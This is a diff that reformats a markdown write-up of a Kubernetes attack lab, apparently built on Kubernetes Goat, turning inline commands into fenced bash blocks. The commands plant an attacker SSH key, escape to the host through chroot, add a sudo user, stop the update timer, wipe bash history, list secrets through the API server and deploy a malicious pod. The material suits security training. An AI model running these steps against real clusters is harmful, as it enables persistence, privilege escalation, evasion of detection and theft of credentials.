@@ -395,20 +395,26 @@ In this scenario, we took the following actions:
 
 - Enabled the SSH server on the host to allow for instance for remote access (persistency) and added a newly generated attacker controlled SSH key to authorized keys on the host. We simply used ssh-keygen to generate a new sample key pair for SSH:
 
-`/usr/bin/sshd start~`
+```bash
+/usr/bin/sshd start~`
 `echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmljeUnkk3eBlavzDmw3Dm5gQJrjCs//3CxJ+4mjbRbja4Hu1o46smTsHJkgXVfwyelUbTTCjRny5LcP9A
 4AzQfdLTkhnHrfFNpSja7ouOzL4cyPrgtA0qvJWYPwRvXYAiO9tJ1G6XEYz3Y+i2WbVP+c/OIUUqojldlJaEeFgVu8+TArHUtAx6HOXkpeFE/+6dBEpb/ezG
 sGO4Afp9FZxCChVoLLWEa6Bdbdjsq0PxKbp3/+kf9OyJCB2kHRiEyJBDGmXrsgo/cJ5mdgfM0EN2OwKJm9MKH+73LpX2HXH+76Vr5OjiedlKxTfQq37rBpyG
 pyE6tQqV1DRLPz7cCi3ALc74FVghQRBVCL/Jv0MXBoBbC3H+Ik148ZyKzGzrBMJkICnaftpQw8fwHkGhzH+zkRK5fwZBS3kEL1lM8hvJ7Q0VxasqOLgpdYAa
-sWE4Y1lCLqTdRjtYsuRshcdJj8soa9tKWwwDbiEPANLvuilsyRrwp0YpWwv2XhpjnpWl+gU= " >> ~/.ssh/authorized_keys`
+sWE4Y1lCLqTdRjtYsuRshcdJj8soa9tKWwwDbiEPANLvuilsyRrwp0YpWwv2XhpjnpWl+gU= " >> ~/.ssh/authorized_keys
+```
 
 - Escape to the node using chroot (basically changing our root directory to the host's and launching bash from there):
 
-`chroot /host-system bash` 
+```bash
+chroot /host-system bash
+```
 
 - Adding a new user to the sudoers group:
 
-`useradd -g sudo Tux`
+```bash
+useradd -g sudo Tux
+```
 
 - Stopping apt-daily-upgrade.timer service
 
@@ -416,11 +422,15 @@ sWE4Y1lCLqTdRjtYsuRshcdJj8soa9tKWwwDbiEPANLvuilsyRrwp0YpWwv2XhpjnpWl+gU= " >> ~/
 Stopping this service allows for instance to hide evidence, delay an update or yet download a malicious package and have it run with privileges.
 In this case, this could allow us further exploitation on the node (which is self-managed in normal times). 
 
-`systemctl stop apt-daily.timer`
+```bash
+systemctl stop apt-daily.timer
+```
 
 - Let's finally again delete our traces
 
-`rm -rf ~/.bash_history`
+```bash
+rm -rf ~/.bash_history
+```
 
 ### Targeting Kube API
 
@@ -468,7 +478,9 @@ It does not work, as we are not in the default namespace. Indeed, the pod are ru
 
 But we can therefore use the correct namespace and run the following command to list secrets:
 
-`curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/secrets`
+```bash
+curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/secrets
+```
 
 <div style="text-align: center">
 <img src="https://user-images.githubusercontent.com/18376283/156610843-96d8321b-3919-4a00-9bc8-db5eaa6a9a47.png" />
@@ -491,7 +503,9 @@ For this scenario, we will use one of the pod provided by Kubernetes Goat, *hack
 We notice at the same time that this deployment has *NET_ADMIN* capability as well as a sensitive volume mount, */etc*.<br />
 Let's deploy that pod in the cluster:
 
-`kubectl apply -f maliciousYAML.yaml`
+```bash
+kubectl apply -f maliciousYAML.yaml
+```
 
 ### Creating a cluster-level privileged role 
 
